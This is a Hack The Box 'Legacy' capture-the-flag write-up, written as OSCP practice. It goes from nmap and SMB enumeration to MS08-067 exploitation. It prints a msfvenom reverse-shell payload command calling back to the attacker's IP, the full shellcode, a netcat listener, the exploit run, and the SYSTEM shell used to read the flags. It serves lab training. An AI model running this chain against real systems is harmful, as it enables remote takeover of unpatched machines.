---
title: Write-up Legacy on HTB
author: eMVee
date: 2023-04-04 19:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, PNPT, SMB, MS08-067]
render_with_liquid: false
---

While preparing for the OSCP exam, you have to gain more experience in hacking and building your methodology to pass the exam. There is a well known list created by TJnull with all kind of vulnerable machines. The machine can be played on [Hack The Box (HTB)](https://www.hackthebox.com/machines/legacy). To hack this machine you have to establish a VPN connection with HTB.

## Getting started
First we should create a project directory for our target machine. Next as soon as the target has been spawned at HTB and we know the IP address of the target, we should assign it to a variable.

```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HTB/

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mcd Legacy    

┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ ip=10.129.135.14
```
As soon as the IP address has been assigned to the variable we can start a ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ ping $ip -c 3
PING 10.129.135.14 (10.129.135.14) 56(84) bytes of data.
64 bytes from 10.129.135.14: icmp_seq=1 ttl=127 time=19.8 ms
64 bytes from 10.129.135.14: icmp_seq=2 ttl=127 time=20.5 ms
64 bytes from 10.129.135.14: icmp_seq=3 ttl=127 time=19.5 ms

--- 10.129.135.14 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2055ms
rtt min/avg/max/mdev = 19.480/19.952/20.529/0.434 ms

```
Based on the ttl value we can almost tell that the target is running on a Windows operating system. We should enumerate open ports and services on our target. To do this we can use nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ nmap -T4 -p- $ip -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 20:10 CEST
Nmap scan report for 10.129.135.14
Host is up (0.045s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 30.84 seconds

```
The ports discovered by nmap are indicating that the might be a SMB service up and running on our target.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip -Pn
[sudo] password for emvee: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 20:54 CEST
Nmap scan report for 10.129.135.14
Host is up (0.018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/4%OT=135%CT=1%CU=38973%PV=Y%DS=2%DC=T%G=Y%TM=642C728
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=F5%GCD=1%ISR=111%TI=I%CI=I%II=I%TS=0)SEQ(
OS:SP=F6%GCD=1%ISR=110%TI=I%CI=I%II=I%SS=S%TS=0)OPS(O1=M539NW0NNT00NNS%O2=M
OS:539NW0NNT00NNS%O3=M539NW0NNT00%O4=M539NW0NNT00NNS%O5=M539NW0NNT00NNS%O6=
OS:M539NNT00NNS)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%W6=FAF0)ECN(R=Y
OS:%DF=Y%T=80%W=FAF0%O=M539NW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD
OS:=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%D
OS:F=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O
OS:=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=B0%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=
OS:G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m48s, deviation: 2h07m16s, median: 4d22h57m48s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00505696172e (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-04-09T23:52:48+03:00

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   17.08 ms 10.10.14.1
2   18.19 ms 10.129.135.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.99 seconds
```
We did discover some information with nmap what we should add to our notes.
 - Windows XP
 - Hostname: Legacy
 - Port 135, 139, 445
    - SMB

Might be vulnerable for a known SMB vulnerability. Let's first enumerat some more information about our target.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ nmblookup -A $ip            
Looking up status of 10.129.135.14
        LEGACY          <00> -         B <ACTIVE> 
        HTB             <00> - <GROUP> B <ACTIVE> 
        LEGACY          <20> -         B <ACTIVE> 
        HTB             <1e> - <GROUP> B <ACTIVE> 
        HTB             <1d> -         B <ACTIVE> 
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 

        MAC Address = 00-50-56-96-17-2E
```
We did not discover any juicy information yet. We should continue enumerating.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ nbtscan $ip  
Doing NBT name scan for addresses from 10.129.135.14

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
10.129.135.14    LEGACY           <server>  <unknown>        00:50:56:96:17:2e

```
We can try to use smbmap to identify shares and try to identify the version of the target.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy/ms08_067]
└─$ smbmap -H $ip      
[+] IP: 10.129.253.57:445       Name: 10.129.253.57 

┌──(emvee㉿kali)-[~/Documents/HTB/Legacy/ms08_067]
└─$ smbmap -H $ip -v
[+] 10.129.253.57:445 is running Windows 5.1 (name:LEGACY) (domain:LEGACY)

```
When we search on Google with the following terms: [Windows 5.1 XP SMB exploit](https://www.google.com/search?q=Windows+5.1+XP+SMB+exploit), we can see that knwon MS08-067 vulnerability is found. Our next step is to search for [ms08-067 github exploit](https://www.google.com/search?q=ms08-067+github+exploit), we find a github with an exploit for it.
```
https://github.com/andyacer/ms08_067
```
We should clone the exploit to our project directory in Kali.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ git clone https://github.com/andyacer/ms08_067/
Cloning into 'ms08_067'...
remote: Enumerating objects: 37, done.
remote: Total 37 (delta 0), reused 0 (delta 0), pack-reused 37
Receiving objects: 100% (37/37), 13.01 KiB | 1.45 MiB/s, done.
Resolving deltas: 100% (11/11), done.

```
Based on the information on the Github page we know what we have to generate some shellcode with msfvenom. Lucky us, it is all well documented.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy/impacket]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.114 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] = 
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x30\xc3\xf9\xba\x83\xee\xfc\xe2\xf4\xcc\x2b\x7b\xba"
"\x30\xc3\x99\x33\xd5\xf2\x39\xde\xbb\x93\xc9\x31\x62\xcf"
"\x72\xe8\x24\x48\x8b\x92\x3f\x74\xb3\x9c\x01\x3c\x55\x86"
"\x51\xbf\xfb\x96\x10\x02\x36\xb7\x31\x04\x1b\x48\x62\x94"
"\x72\xe8\x20\x48\xb3\x86\xbb\x8f\xe8\xc2\xd3\x8b\xf8\x6b"
"\x61\x48\xa0\x9a\x31\x10\x72\xf3\x28\x20\xc3\xf3\xbb\xf7"
"\x72\xbb\xe6\xf2\x06\x16\xf1\x0c\xf4\xbb\xf7\xfb\x19\xcf"
"\xc6\xc0\x84\x42\x0b\xbe\xdd\xcf\xd4\x9b\x72\xe2\x14\xc2"
"\x2a\xdc\xbb\xcf\xb2\x31\x68\xdf\xf8\x69\xbb\xc7\x72\xbb"
"\xe0\x4a\xbd\x9e\x14\x98\xa2\xdb\x69\x99\xa8\x45\xd0\x9c"
"\xa6\xe0\xbb\xd1\x12\x37\x6d\xab\xca\x88\x30\xc3\x91\xcd"
"\x43\xf1\xa6\xee\x58\x8f\x8e\x9c\x37\x3c\x2c\x02\xa0\xc2"
"\xf9\xba\x19\x07\xad\xea\x58\xea\x79\xd1\x30\x3c\x2c\xea"
"\x60\x93\xa9\xfa\x60\x83\xa9\xd2\xda\xcc\x26\x5a\xcf\x16"
"\x6e\xd0\x35\xab\xf3\xb0\x3e\xb1\x91\xb8\x30\xc2\x42\x33"
"\xd6\xa9\xe9\xec\x67\xab\x60\x1f\x44\xa2\x06\x6f\xb5\x03"
"\x8d\xb6\xcf\x8d\xf1\xcf\xdc\xab\x09\x0f\x92\x95\x06\x6f"
"\x58\xa0\x94\xde\x30\x4a\x1a\xed\x67\x94\xc8\x4c\x5a\xd1"
"\xa0\xec\xd2\x3e\x9f\x7d\x74\xe7\xc5\xbb\x31\x4e\xbd\x9e"
"\x20\x05\xf9\xfe\x64\x93\xaf\xec\x66\x85\xaf\xf4\x66\x95"
"\xaa\xec\x58\xba\x35\x85\xb6\x3c\x2c\x33\xd0\x8d\xaf\xfc"
"\xcf\xf3\x91\xb2\xb7\xde\x99\x45\xe5\x78\x19\xa7\x1a\xc9"
"\x91\x1c\xa5\x7e\x64\x45\xe5\xff\xff\xc6\x3a\x43\x02\x5a"
"\x45\xc6\x42\xfd\x23\xb1\x96\xd0\x30\x90\x06\x6f";

```
Net move to our directory for the exploit.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ cd ms08_067 
```
Next we should edit the exploit a bit in Visual Code.

![Image](/assets/img/WriteUp/HTB/Legacy//Pasted image 20230404211458.png){: width="700" height="400" }

As soon as it is saved we should start our netcat listener in another terminal.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ sudo nc -lvp 443                       
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

```

## Initial access

Now we are ready to launch the exploit. It will create a reverse shell back to our machine.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy/ms08_067]
└─$ python ms08_067_2018.py 10.129.253.57 7 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (AlwaysOn NX)

[-]Initiating connection
[-]connected to ncacn_np:10.129.253.57[\pipe\browser]
Exploit finish

```
Let's check our netcat listener for a connection.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ sudo nc -lvp 443                       
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.253.57.
Ncat: Connection from 10.129.253.57:1042.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

```
We got a connection on the machine. Since we got a connection on the target as system (default) we can capture the user and root flag.

```bash
C:\WINDOWS\Temp>cd c:\
cd c:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  08:30 ��                 0 AUTOEXEC.BAT
16/03/2017  08:30 ��                 0 CONFIG.SYS
16/03/2017  09:07 ��    <DIR>          Documents and Settings
29/12/2017  11:41 ��    <DIR>          Program Files
18/05/2022  03:10 ��    <DIR>          WINDOWS
               2 File(s)              0 bytes
               3 Dir(s)   6.312.620.032 bytes free

C:\>cd "Documents and Settings"
cd "Documents and Settings"

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.312.615.936 bytes free

C:\Documents and Settings>cd Administrator
cd Administrator

C:\Documents and Settings\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:18 ��    <DIR>          Desktop
16/03/2017  09:07 ��    <DIR>          Favorites
16/03/2017  09:07 ��    <DIR>          My Documents
16/03/2017  08:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.312.615.936 bytes free

C:\Documents and Settings\Administrator>cd Desktop
cd Desktop

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18 ��    <DIR>          .
16/03/2017  09:18 ��    <DIR>          ..
16/03/2017  09:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.312.615.936 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.tx
type root.tx
The system cannot find the file specified.

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
ROOT FLAG IS LOCATED HERE
C:\Documents and Settings\Administrator\Desktop>cd ../../john/desktop
cd ../../john/desktop

C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19 ��    <DIR>          .
16/03/2017  09:19 ��    <DIR>          ..
16/03/2017  09:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.296.039.424 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
USER FLAG IS LOCATED HERE
C:\Documents and Settings\john\Desktop>

```
For OSCP we would have to show the evidence who we are. But on Windows XP there was no `whoami` binary yet. Since service pack 2 it is available, but only if installed from this service pack. If the whoami binary is not working we can copy a local one from Kali and transfer it to our target.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ cp /usr/share/windows-resources/binaries/whoami.exe .

┌──(emvee㉿kali)-[~/Documents/HTB/Legacy]
└─$ sudo python3 -m http.server 80
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
With the above commands we host the file so we are able to download the file on the victim. But for now we don't share that here.